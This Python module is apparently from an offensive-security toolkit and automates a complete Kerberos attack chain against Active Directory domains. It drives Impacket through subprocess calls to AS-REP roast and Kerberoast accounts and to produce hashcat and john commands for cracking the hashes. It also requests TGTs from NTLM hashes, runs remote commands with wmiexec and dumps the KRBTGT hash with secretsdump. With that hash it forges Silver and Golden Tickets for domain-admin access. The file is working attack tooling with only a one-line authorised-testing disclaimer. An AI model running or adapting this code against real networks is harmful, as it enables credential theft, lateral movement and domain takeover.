"""
Kerberos Attack Chain Module
============================
Complete Kerberos abuse chain: AS-REP Roast → Over-PtH → Silver/Golden Ticket

Features:
- AS-REP Roasting (users without pre-auth)
- Kerberoasting (SPN enumeration & cracking)
- Pass-the-Hash / Pass-the-Ticket
- Overpass-the-Hash (OPTH)
- Silver Ticket forging
- Golden Ticket forging
- Diamond Ticket creation
- S4U2Self/S4U2Proxy abuse
- Constrained/Unconstrained delegation abuse

⚠️ YASAL UYARI: Bu modül sadece yetkili penetrasyon testleri içindir.
"""

from __future__ import annotations
import os
import re
import json
import struct
import hashlib
import secrets
import base64
import logging
import subprocess
from datetime import datetime, timedelta
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Any, Tuple
from enum import Enum, auto

from cybermodules.helpers import log_to_intel

logger = logging.getLogger("kerberos_chain")


# ============================================================
# ENUMS & CONSTANTS
# ============================================================

class KerberosAttackType(Enum):
    """Kerberos attack types"""
    AS_REP_ROAST = "as_rep_roast"
    KERBEROAST = "kerberoast"
    PASS_THE_HASH = "pth"
    PASS_THE_TICKET = "ptt"
    OVERPASS_THE_HASH = "opth"
    SILVER_TICKET = "silver_ticket"
    GOLDEN_TICKET = "golden_ticket"
    DIAMOND_TICKET = "diamond_ticket"
    S4U2SELF = "s4u2self"
    S4U2PROXY = "s4u2proxy"
    CONSTRAINED_DELEGATION = "constrained_delegation"
    UNCONSTRAINED_DELEGATION = "unconstrained_delegation"
    RBCD = "rbcd"  # Resource-Based Constrained Delegation


class EncryptionType(Enum):
    """Kerberos encryption types"""
    RC4_HMAC = 23
    AES128_CTS_HMAC_SHA1 = 17
    AES256_CTS_HMAC_SHA1 = 18
    DES_CBC_MD5 = 3


class TicketStatus(Enum):
    """Ticket status"""
    PENDING = "pending"
    FORGED = "forged"
    VERIFIED = "verified"
    INJECTED = "injected"
    FAILED = "failed"
    EXPIRED = "expired"


# ============================================================
# DATACLASSES
# ============================================================

@dataclass
class ASREPUser:
    """User vulnerable to AS-REP roasting"""
    username: str
    domain: str
    hash_type: str = "23"  # RC4 by default
    as_rep_hash: str = ""
    cracked_password: str = ""
    discovered_at: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_hashcat_format(self) -> str:
        """Convert to hashcat format"""
        return f"$krb5asrep${self.hash_type}${self.username}@{self.domain}:{self.as_rep_hash}"
    
    def to_john_format(self) -> str:
        """Convert to John format"""
        return f"$krb5asrep${self.username}@{self.domain}:{self.as_rep_hash}"


@dataclass
class KerberoastHash:
    """Kerberoasting hash"""
    username: str
    domain: str
    spn: str
    hash_type: str = "23"
    tgs_hash: str = ""
    cracked_password: str = ""
    discovered_at: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_hashcat_format(self) -> str:
        """Convert to hashcat format ($krb5tgs$)"""
        return f"$krb5tgs${self.hash_type}$*{self.username}${self.domain}${self.spn}*${self.tgs_hash}"


@dataclass
class KerberosTicket:
    """Kerberos ticket structure"""
    ticket_type: str
    target_user: str
    target_domain: str
    domain_sid: str = ""
    target_service: str = ""
    target_host: str = ""
    encryption_type: EncryptionType = EncryptionType.AES256_CTS_HMAC_SHA1
    
    # Ticket data
    ticket_data: bytes = field(default_factory=bytes)
    ticket_file: str = ""
    ccache_file: str = ""
    kirbi_file: str = ""
    
    # Hashes used
    krbtgt_hash: str = ""
    service_hash: str = ""
    aes_key: str = ""
    
    # Metadata
    forged_at: str = field(default_factory=lambda: datetime.now().isoformat())
    valid_from: str = ""
    valid_until: str = ""
    status: TicketStatus = TicketStatus.PENDING
    
    # Extra SIDs for golden ticket
    extra_sids: List[str] = field(default_factory=list)
    groups: List[int] = field(default_factory=lambda: [512, 513, 518, 519, 520])  # DA, DU, SA, EA, GPO
    
    def to_dict(self) -> Dict:
        return {
            'ticket_type': self.ticket_type,
            'target_user': self.target_user,
            'target_domain': self.target_domain,
            'domain_sid': self.domain_sid,
            'target_service': self.target_service,
            'encryption_type': self.encryption_type.name,
            'forged_at': self.forged_at,
            'valid_until': self.valid_until,
            'status': self.status.value,
            'ccache_file': self.ccache_file,
        }


@dataclass
class ChainStep:
    """Single step in Kerberos attack chain"""
    step_name: str
    attack_type: KerberosAttackType
    target: str
    status: str = "pending"
    result: Dict = field(default_factory=dict)
    commands: List[str] = field(default_factory=list)
    started_at: str = ""
    completed_at: str = ""
    error: str = ""


@dataclass
class KerberosChainResult:
    """Result of full Kerberos attack chain"""
    chain_id: str
    success: bool
    steps: List[ChainStep] = field(default_factory=list)
    asrep_users: List[ASREPUser] = field(default_factory=list)
    kerberoast_hashes: List[KerberoastHash] = field(default_factory=list)
    tickets: List[KerberosTicket] = field(default_factory=list)
    compromised_accounts: List[Dict] = field(default_factory=list)
    domain_admin_achieved: bool = False
    final_ticket: Optional[KerberosTicket] = None
    
    def to_dict(self) -> Dict:
        return {
            'chain_id': self.chain_id,
            'success': self.success,
            'steps': [asdict(s) for s in self.steps],
            'asrep_users_count': len(self.asrep_users),
            'kerberoast_hashes_count': len(self.kerberoast_hashes),
            'tickets_count': len(self.tickets),
            'compromised_accounts': len(self.compromised_accounts),
            'domain_admin_achieved': self.domain_admin_achieved,
        }


# ============================================================
# AS-REP ROASTING
# ============================================================

class ASREPRoaster:
    """
    AS-REP Roasting Attack
    
    Targets users without Kerberos pre-authentication.
    Retrieves encrypted TGT that can be cracked offline.
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.discovered_users: List[ASREPUser] = []
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"ASREP_{msg_type}", message)
        logger.info(f"[ASREP][{msg_type}] {message}")
    
    def enumerate_no_preauth_users(
        self,
        domain: str,
        dc_ip: str,
        username: str = None,
        password: str = None,
        userlist: List[str] = None
    ) -> List[ASREPUser]:
        """
        Enumerate users without Kerberos pre-authentication
        
        Uses GetNPUsers.py from Impacket
        """
        self._log("ENUM", f"Enumerating AS-REP roastable users in {domain}")
        
        users = []
        
        # Build command
        if username and password:
            # Authenticated enumeration
            cmd = [
                "impacket-GetNPUsers",
                f"{domain}/{username}:{password}",
                "-dc-ip", dc_ip,
                "-request",
                "-format", "hashcat"
            ]
        else:
            # Unauthenticated with userlist
            if not userlist:
                userlist = self._get_common_userlist()
            
            cmd = [
                "impacket-GetNPUsers",
                f"{domain}/",
                "-dc-ip", dc_ip,
                "-usersfile", "-",
                "-format", "hashcat",
                "-no-pass"
            ]
        
        self._log("CMD", f"Running: {' '.join(cmd)}")
        
        try:
            if userlist:
                # Pipe userlist to stdin
                result = subprocess.run(
                    cmd,
                    input="\n".join(userlist),
                    capture_output=True,
                    text=True,
                    timeout=300
                )
            else:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            output = result.stdout + result.stderr
            
            # Parse AS-REP hashes
            users = self._parse_asrep_output(output, domain)
            
            self._log("SUCCESS", f"Found {len(users)} AS-REP roastable users")
            
        except subprocess.TimeoutExpired:
            self._log("ERROR", "AS-REP enumeration timed out")
        except Exception as e:
            self._log("ERROR", f"AS-REP enumeration failed: {str(e)}")
        
        self.discovered_users.extend(users)
        return users
    
    def _parse_asrep_output(self, output: str, domain: str) -> List[ASREPUser]:
        """Parse GetNPUsers output for AS-REP hashes"""
        users = []
        
        # Pattern for hashcat format
        pattern = r'\$krb5asrep\$(\d+)\$([^@]+)@([^:]+):([a-fA-F0-9$]+)'
        
        for match in re.finditer(pattern, output):
            hash_type, username, domain_found, hash_data = match.groups()
            
            user = ASREPUser(
                username=username,
                domain=domain_found or domain,
                hash_type=hash_type,
                as_rep_hash=hash_data
            )
            users.append(user)
        
        return users
    
    def _get_common_userlist(self) -> List[str]:
        """Common usernames for AS-REP roasting"""
        return [
            "administrator", "admin", "guest", "krbtgt",
            "backup", "service", "svc_sql", "svc_backup",
            "svc_iis", "svc_exchange", "sqlservice", "webservice",
            "test", "user", "support", "helpdesk",
        ]
    
    def generate_crack_commands(self, users: List[ASREPUser] = None) -> Dict[str, str]:
        """Generate hashcat/john commands to crack AS-REP hashes"""
        users = users or self.discovered_users
        
        if not users:
            return {}
        
        # Save hashes to file
        hash_file = f"/tmp/asrep_hashes_{self.scan_id}.txt"
        with open(hash_file, 'w') as f:
            for user in users:
                f.write(user.to_hashcat_format() + "\n")
        
        return {
            'hashcat': f"hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt",
            'hashcat_rules': f"hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
            'john': f"john --wordlist=/usr/share/wordlists/rockyou.txt {hash_file}",
            'hash_file': hash_file
        }


# ============================================================
# KERBEROASTING
# ============================================================

class Kerberoaster:
    """
    Kerberoasting Attack
    
    Requests TGS tickets for SPNs and cracks them offline.
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.discovered_spns: List[KerberoastHash] = []
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"KERBEROAST_{msg_type}", message)
        logger.info(f"[KERBEROAST][{msg_type}] {message}")
    
    def roast(
        self,
        domain: str,
        dc_ip: str,
        username: str,
        password: str = None,
        ntlm_hash: str = None,
        target_spn: str = None
    ) -> List[KerberoastHash]:
        """
        Perform Kerberoasting attack
        
        Uses GetUserSPNs.py from Impacket
        """
        self._log("START", f"Starting Kerberoasting against {domain}")
        
        # Build command
        if ntlm_hash:
            auth = f"{domain}/{username} -hashes :{ntlm_hash}"
        else:
            auth = f"{domain}/{username}:{password}"
        
        cmd = [
            "impacket-GetUserSPNs",
            auth,
            "-dc-ip", dc_ip,
            "-request",
            "-outputfile", f"/tmp/kerberoast_{self.scan_id}.txt"
        ]
        
        if target_spn:
            cmd.extend(["-target-domain", target_spn])
        
        self._log("CMD", f"Running: {' '.join(cmd[:4])}...")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            output = result.stdout + result.stderr
            
            # Parse TGS hashes
            hashes = self._parse_kerberoast_output(output, domain)
            
            self._log("SUCCESS", f"Retrieved {len(hashes)} TGS hashes")
            
        except Exception as e:
            self._log("ERROR", f"Kerberoasting failed: {str(e)}")
            hashes = []
        
        self.discovered_spns.extend(hashes)
        return hashes
    
    def _parse_kerberoast_output(self, output: str, domain: str) -> List[KerberoastHash]:
        """Parse GetUserSPNs output"""
        hashes = []
        
        # Pattern for TGS hash
        pattern = r'\$krb5tgs\$(\d+)\$\*([^$]+)\$([^$]+)\$([^*]+)\*\$([a-fA-F0-9$]+)'
        
        for match in re.finditer(pattern, output):
            hash_type, username, domain_found, spn, hash_data = match.groups()
            
            kerb_hash = KerberoastHash(
                username=username,
                domain=domain_found or domain,
                spn=spn,
                hash_type=hash_type,
                tgs_hash=hash_data
            )
            hashes.append(kerb_hash)
        
        return hashes
    
    def generate_crack_commands(self, hashes: List[KerberoastHash] = None) -> Dict[str, str]:
        """Generate cracking commands"""
        hashes = hashes or self.discovered_spns
        
        if not hashes:
            return {}
        
        hash_file = f"/tmp/kerberoast_hashes_{self.scan_id}.txt"
        with open(hash_file, 'w') as f:
            for h in hashes:
                f.write(h.to_hashcat_format() + "\n")
        
        return {
            'hashcat': f"hashcat -m 13100 {hash_file} /usr/share/wordlists/rockyou.txt",
            'hashcat_rules': f"hashcat -m 13100 {hash_file} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
            'john': f"john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs {hash_file}",
            'hash_file': hash_file
        }


# ============================================================
# PASS-THE-HASH / OVERPASS-THE-HASH
# ============================================================

class OverpassTheHash:
    """
    Overpass-the-Hash (OPTH) Attack
    
    Uses NTLM hash to request Kerberos TGT, enabling
    Pass-the-Ticket attacks without knowing the password.
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"OPTH_{msg_type}", message)
        logger.info(f"[OPTH][{msg_type}] {message}")
    
    def request_tgt_with_hash(
        self,
        domain: str,
        username: str,
        ntlm_hash: str,
        dc_ip: str,
        aes_key: str = None
    ) -> Optional[KerberosTicket]:
        """
        Request TGT using NTLM hash (Overpass-the-Hash)
        
        Uses getTGT.py from Impacket
        """
        self._log("START", f"Requesting TGT for {username}@{domain} via OPTH")
        
        ccache_file = f"/tmp/tgt_{username}_{self.scan_id}.ccache"
        
        # Build command
        if aes_key:
            cmd = [
                "impacket-getTGT",
                f"{domain}/{username}",
                "-aesKey", aes_key,
                "-dc-ip", dc_ip
            ]
        else:
            cmd = [
                "impacket-getTGT",
                f"{domain}/{username}",
                "-hashes", f":{ntlm_hash}",
                "-dc-ip", dc_ip
            ]
        
        self._log("CMD", f"Running: {' '.join(cmd[:3])}...")
        
        try:
            env = os.environ.copy()
            env['KRB5CCNAME'] = ccache_file
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60,
                env=env
            )
            
            if "Saving ticket" in result.stdout or os.path.exists(ccache_file):
                ticket = KerberosTicket(
                    ticket_type="TGT",
                    target_user=username,
                    target_domain=domain,
                    target_service="krbtgt",
                    ccache_file=ccache_file,
                    status=TicketStatus.FORGED,
                    valid_until=(datetime.now() + timedelta(hours=10)).isoformat()
                )
                
                self._log("SUCCESS", f"TGT obtained and saved to {ccache_file}")
                return ticket
            else:
                self._log("ERROR", f"Failed to obtain TGT: {result.stderr}")
                return None
                
        except Exception as e:
            self._log("ERROR", f"OPTH failed: {str(e)}")
            return None
    
    def use_ticket(self, ticket: KerberosTicket, target: str, command: str) -> Tuple[bool, str]:
        """
        Use obtained ticket for lateral movement
        """
        self._log("USE", f"Using ticket to access {target}")
        
        env = os.environ.copy()
        env['KRB5CCNAME'] = ticket.ccache_file
        
        # Try wmiexec with Kerberos
        cmd = [
            "impacket-wmiexec",
            f"{ticket.target_domain}/{ticket.target_user}@{target}",
            "-k", "-no-pass",
            command
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60, env=env)
            
            if result.returncode == 0:
                self._log("SUCCESS", f"Command executed on {target}")
                return True, result.stdout
            else:
                return False, result.stderr
                
        except Exception as e:
            return False, str(e)


# ============================================================
# SILVER TICKET
# ============================================================

class SilverTicketForger:
    """
    Silver Ticket Forging
    
    Creates service tickets using service account NTLM hash.
    Useful for accessing specific services without DC interaction.
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"SILVER_{msg_type}", message)
        logger.info(f"[SILVER][{msg_type}] {message}")
    
    def forge(
        self,
        domain: str,
        domain_sid: str,
        target_user: str,
        target_host: str,
        service: str,
        service_hash: str,
        user_id: int = 500,
        groups: List[int] = None
    ) -> Optional[KerberosTicket]:
        """
        Forge a Silver Ticket
        
        Uses ticketer.py from Impacket
        """
        self._log("START", f"Forging Silver Ticket for {service}/{target_host}")
        
        spn = f"{service}/{target_host}"
        ccache_file = f"/tmp/silver_{service}_{self.scan_id}.ccache"
        
        if groups is None:
            groups = [512, 513, 518, 519, 520]  # Domain Admins, etc.
        
        groups_str = ",".join(str(g) for g in groups)
        
        cmd = [
            "impacket-ticketer",
            "-nthash", service_hash,
            "-domain", domain,
            "-domain-sid", domain_sid,
            "-spn", spn,
            "-user-id", str(user_id),
            "-groups", groups_str,
            target_user
        ]
        
        self._log("CMD", f"Forging: {service}/{target_host}")
        
        try:
            env = os.environ.copy()
            env['KRB5CCNAME'] = ccache_file
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60,
                cwd="/tmp"
            )
            
            # Ticketer creates .ccache file
            expected_ccache = f"/tmp/{target_user}.ccache"
            
            if os.path.exists(expected_ccache):
                os.rename(expected_ccache, ccache_file)
                
                ticket = KerberosTicket(
                    ticket_type="Silver",
                    target_user=target_user,
                    target_domain=domain,
                    domain_sid=domain_sid,
                    target_service=service,
                    target_host=target_host,
                    service_hash=service_hash,
                    ccache_file=ccache_file,
                    status=TicketStatus.FORGED,
                    groups=groups,
                    valid_until=(datetime.now() + timedelta(hours=10)).isoformat()
                )
                
                self._log("SUCCESS", f"Silver Ticket forged: {ccache_file}")
                return ticket
            else:
                self._log("ERROR", f"Ticketer failed: {result.stderr}")
                return None
                
        except Exception as e:
            self._log("ERROR", f"Silver Ticket forging failed: {str(e)}")
            return None


# ============================================================
# GOLDEN TICKET
# ============================================================

class GoldenTicketForger:
    """
    Golden Ticket Forging
    
    Creates TGT using KRBTGT hash for complete domain dominance.
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"GOLDEN_{msg_type}", message)
        logger.info(f"[GOLDEN][{msg_type}] {message}")
    
    def forge(
        self,
        domain: str,
        domain_sid: str,
        krbtgt_hash: str,
        target_user: str = "Administrator",
        user_id: int = 500,
        groups: List[int] = None,
        extra_sids: List[str] = None,
        duration_hours: int = 10
    ) -> Optional[KerberosTicket]:
        """
        Forge a Golden Ticket
        
        Uses ticketer.py from Impacket with KRBTGT hash
        """
        self._log("START", f"Forging Golden Ticket for {target_user}@{domain}")
        
        ccache_file = f"/tmp/golden_{target_user}_{self.scan_id}.ccache"
        
        if groups is None:
            groups = [512, 513, 518, 519, 520]  # Domain privileged groups
        
        groups_str = ",".join(str(g) for g in groups)
        
        cmd = [
            "impacket-ticketer",
            "-nthash", krbtgt_hash,
            "-domain", domain,
            "-domain-sid", domain_sid,
            "-user-id", str(user_id),
            "-groups", groups_str,
            "-duration", str(duration_hours),
            target_user
        ]
        
        if extra_sids:
            cmd.extend(["-extra-sid", ",".join(extra_sids)])
        
        self._log("CMD", f"Forging Golden Ticket for {target_user}")
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60,
                cwd="/tmp"
            )
            
            expected_ccache = f"/tmp/{target_user}.ccache"
            
            if os.path.exists(expected_ccache):
                os.rename(expected_ccache, ccache_file)
                
                ticket = KerberosTicket(
                    ticket_type="Golden",
                    target_user=target_user,
                    target_domain=domain,
                    domain_sid=domain_sid,
                    target_service="krbtgt",
                    krbtgt_hash=krbtgt_hash,
                    ccache_file=ccache_file,
                    status=TicketStatus.FORGED,
                    groups=groups,
                    extra_sids=extra_sids or [],
                    valid_until=(datetime.now() + timedelta(hours=duration_hours)).isoformat()
                )
                
                self._log("SUCCESS", f"Golden Ticket forged: {ccache_file}")
                return ticket
            else:
                self._log("ERROR", f"Ticketer failed: {result.stderr}")
                return None
                
        except Exception as e:
            self._log("ERROR", f"Golden Ticket forging failed: {str(e)}")
            return None
    
    def forge_with_aes(
        self,
        domain: str,
        domain_sid: str,
        aes256_key: str,
        target_user: str = "Administrator"
    ) -> Optional[KerberosTicket]:
        """Forge Golden Ticket with AES key (more stealthy)"""
        self._log("START", f"Forging Golden Ticket with AES256 for {target_user}")
        
        ccache_file = f"/tmp/golden_aes_{target_user}_{self.scan_id}.ccache"
        
        cmd = [
            "impacket-ticketer",
            "-aesKey", aes256_key,
            "-domain", domain,
            "-domain-sid", domain_sid,
            target_user
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60, cwd="/tmp")
            
            expected_ccache = f"/tmp/{target_user}.ccache"
            
            if os.path.exists(expected_ccache):
                os.rename(expected_ccache, ccache_file)
                
                ticket = KerberosTicket(
                    ticket_type="Golden",
                    target_user=target_user,
                    target_domain=domain,
                    domain_sid=domain_sid,
                    target_service="krbtgt",
                    aes_key=aes256_key,
                    encryption_type=EncryptionType.AES256_CTS_HMAC_SHA1,
                    ccache_file=ccache_file,
                    status=TicketStatus.FORGED,
                    valid_until=(datetime.now() + timedelta(hours=10)).isoformat()
                )
                
                self._log("SUCCESS", f"AES Golden Ticket forged: {ccache_file}")
                return ticket
            
            return None
            
        except Exception as e:
            self._log("ERROR", f"AES Golden Ticket failed: {str(e)}")
            return None


# ============================================================
# FULL KERBEROS ATTACK CHAIN
# ============================================================

class KerberosAttackChain:
    """
    Full Kerberos Attack Chain Orchestrator
    
    Automates the complete Kerberos abuse chain:
    1. AS-REP Roasting - Find users without pre-auth
    2. Kerberoasting - Get SPN hashes
    3. Overpass-the-Hash - Use hashes for TGT
    4. Silver Ticket - Access specific services
    5. Golden Ticket - Full domain dominance
    """
    
    def __init__(self, scan_id: int = 0):
        self.scan_id = scan_id
        self.chain_id = secrets.token_hex(8)
        
        # Attack modules
        self.asrep = ASREPRoaster(scan_id)
        self.kerberoast = Kerberoaster(scan_id)
        self.opth = OverpassTheHash(scan_id)
        self.silver = SilverTicketForger(scan_id)
        self.golden = GoldenTicketForger(scan_id)
        
        # Results
        self.result = KerberosChainResult(
            chain_id=self.chain_id,
            success=False
        )
    
    def _log(self, msg_type: str, message: str):
        log_to_intel(self.scan_id, f"KERBCHAIN_{msg_type}", message)
        logger.info(f"[KERBCHAIN][{msg_type}] {message}")
    
    def execute_full_chain(
        self,
        domain: str,
        dc_ip: str,
        username: str = None,
        password: str = None,
        ntlm_hash: str = None,
        krbtgt_hash: str = None,
        domain_sid: str = None,
        target_spn: str = None,
        wordlist: str = "/usr/share/wordlists/rockyou.txt"
    ) -> KerberosChainResult:
        """
        Execute full Kerberos attack chain
        
        Chain: AS-REP → Kerberoast → OPTH → Silver → Golden
        """
        self._log("START", f"Starting Kerberos attack chain against {domain}")
        
        # Step 1: AS-REP Roasting
        step1 = ChainStep(
            step_name="AS-REP Roasting",
            attack_type=KerberosAttackType.AS_REP_ROAST,
            target=domain,
            started_at=datetime.now().isoformat()
        )
        
        asrep_users = self.asrep.enumerate_no_preauth_users(
            domain=domain,
            dc_ip=dc_ip,
            username=username,
            password=password
        )
        
        step1.status = "completed" if asrep_users else "no_results"
        step1.result = {'users_found': len(asrep_users)}
        step1.commands = [self.asrep.generate_crack_commands().get('hashcat', '')]
        step1.completed_at = datetime.now().isoformat()
        
        self.result.steps.append(step1)
        self.result.asrep_users = asrep_users
        
        # Step 2: Kerberoasting (if we have credentials)
        if username and (password or ntlm_hash):
            step2 = ChainStep(
                step_name="Kerberoasting",
                attack_type=KerberosAttackType.KERBEROAST,
                target=domain,
                started_at=datetime.now().isoformat()
            )
            
            kerb_hashes = self.kerberoast.roast(
                domain=domain,
                dc_ip=dc_ip,
                username=username,
                password=password,
                ntlm_hash=ntlm_hash,
                target_spn=target_spn
            )
            
            step2.status = "completed" if kerb_hashes else "no_results"
            step2.result = {'hashes_found': len(kerb_hashes)}
            step2.commands = [self.kerberoast.generate_crack_commands().get('hashcat', '')]
            step2.completed_at = datetime.now().isoformat()
            
            self.result.steps.append(step2)
            self.result.kerberoast_hashes = kerb_hashes
        
        # Step 3: Overpass-the-Hash (if we have NTLM hash)
        if ntlm_hash:
            step3 = ChainStep(
                step_name="Overpass-the-Hash",
                attack_type=KerberosAttackType.OVERPASS_THE_HASH,
                target=username,
                started_at=datetime.now().isoformat()
            )
            
            tgt = self.opth.request_tgt_with_hash(
                domain=domain,
                username=username,
                ntlm_hash=ntlm_hash,
                dc_ip=dc_ip
            )
            
            step3.status = "completed" if tgt else "failed"
            step3.result = {'tgt_obtained': tgt is not None}
            step3.completed_at = datetime.now().isoformat()
            
            self.result.steps.append(step3)
            
            if tgt:
                self.result.tickets.append(tgt)
        
        # Step 4: Golden Ticket (if we have KRBTGT hash)
        if krbtgt_hash and domain_sid:
            step4 = ChainStep(
                step_name="Golden Ticket",
                attack_type=KerberosAttackType.GOLDEN_TICKET,
                target=domain,
                started_at=datetime.now().isoformat()
            )
            
            golden = self.golden.forge(
                domain=domain,
                domain_sid=domain_sid,
                krbtgt_hash=krbtgt_hash
            )
            
            step4.status = "completed" if golden else "failed"
            step4.result = {'ticket_forged': golden is not None}
            step4.completed_at = datetime.now().isoformat()
            
            self.result.steps.append(step4)
            
            if golden:
                self.result.tickets.append(golden)
                self.result.final_ticket = golden
                self.result.domain_admin_achieved = True
                self.result.success = True
        
        self._log("COMPLETE", f"Chain completed. DA achieved: {self.result.domain_admin_achieved}")
        
        return self.result
    
    def escalation_path_from_hash(
        self,
        domain: str,
        dc_ip: str,
        username: str,
        ntlm_hash: str,
        target_host: str = None
    ) -> KerberosChainResult:
        """
        Escalation path starting from an NTLM hash
        
        OPTH → Dump more hashes → Silver/Golden
        """
        self._log("START", f"Hash escalation path for {username}")
        
        # Step 1: OPTH to get TGT
        tgt = self.opth.request_tgt_with_hash(
            domain=domain,
            username=username,
            ntlm_hash=ntlm_hash,
            dc_ip=dc_ip
        )
        
        if not tgt:
            self._log("FAILED", "Could not obtain TGT via OPTH")
            return self.result
        
        self.result.tickets.append(tgt)
        
        # Step 2: Use TGT to access DC and dump hashes
        if target_host:
            # Try to dump KRBTGT hash via secretsdump
            self._log("ESCALATE", f"Attempting to dump secrets from {target_host}")
            
            cmd = [
                "impacket-secretsdump",
                f"{domain}/{username}@{target_host}",
                "-k", "-no-pass",
                "-just-dc-user", "krbtgt"
            ]
            
            env = os.environ.copy()
            env['KRB5CCNAME'] = tgt.ccache_file
            
            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=120,
                    env=env
                )
                
                # Parse KRBTGT hash
                krbtgt_match = re.search(r'krbtgt:(\d+):([a-fA-F0-9]+):([a-fA-F0-9]+)', result.stdout)
                
                if krbtgt_match:
                    krbtgt_hash = krbtgt_match.group(3)
                    self._log("SUCCESS", "KRBTGT hash obtained!")
                    
                    # Now forge Golden Ticket
                    # Need domain SID - extract from dump
                    sid_match = re.search(r'S-1-5-21-\d+-\d+-\d+', result.stdout)
                    domain_sid = sid_match.group(0) if sid_match else None
                    
                    if domain_sid:
                        golden = self.golden.forge(
                            domain=domain,
                            domain_sid=domain_sid,
                            krbtgt_hash=krbtgt_hash
                        )
                        
                        if golden:
                            self.result.tickets.append(golden)
                            self.result.final_ticket = golden
                            self.result.domain_admin_achieved = True
                            self.result.success = True
                            
            except Exception as e:
                self._log("ERROR", f"Secret dump failed: {str(e)}")
        
        return self.result
    
    def generate_attack_diagram(self) -> str:
        """Generate Mermaid diagram of attack chain"""
        diagram = '''```mermaid
flowchart TB
    subgraph ENUM["🔍 ENUMERATION"]
        E1[User Enumeration]
        E2[SPN Enumeration]
        E3[Delegation Check]
    end
    
    subgraph ROAST["🔥 ROASTING"]
        R1[AS-REP Roasting]
        R2[Kerberoasting]
        R3[Crack Hashes]
    end
    
    subgraph PTX["🎫 PASS-THE-X"]
        P1[Pass-the-Hash]
        P2[Overpass-the-Hash]
        P3[Pass-the-Ticket]
    end
    
    subgraph TICKETS["🎟️ TICKET FORGING"]
        T1[Silver Ticket]
        T2[Golden Ticket]
        T3[Diamond Ticket]
    end
    
    subgraph PERSIST["🔒 PERSISTENCE"]
        X1[DCSync]
        X2[SID History]
        X3[Skeleton Key]
    end
    
    E1 --> R1
    E2 --> R2
    R1 --> R3
    R2 --> R3
    R3 --> P1
    P1 --> P2
    P2 --> P3
    P3 --> T1
    T1 --> T2
    T2 --> X1
    X1 --> X2
    
    style T2 fill:#ff6b6b,color:white
    style X1 fill:#ff6b6b,color:white
```'''
        return diagram


# ============================================================
# EXPORTS
# ============================================================

__all__ = [
    # Enums
    'KerberosAttackType',
    'EncryptionType',
    'TicketStatus',
    
    # Dataclasses
    'ASREPUser',
    'KerberoastHash',
    'KerberosTicket',
    'ChainStep',
    'KerberosChainResult',
    
    # Attack classes
    'ASREPRoaster',
    'Kerberoaster',
    'OverpassTheHash',
    'SilverTicketForger',
    'GoldenTicketForger',
    'KerberosAttackChain',
]
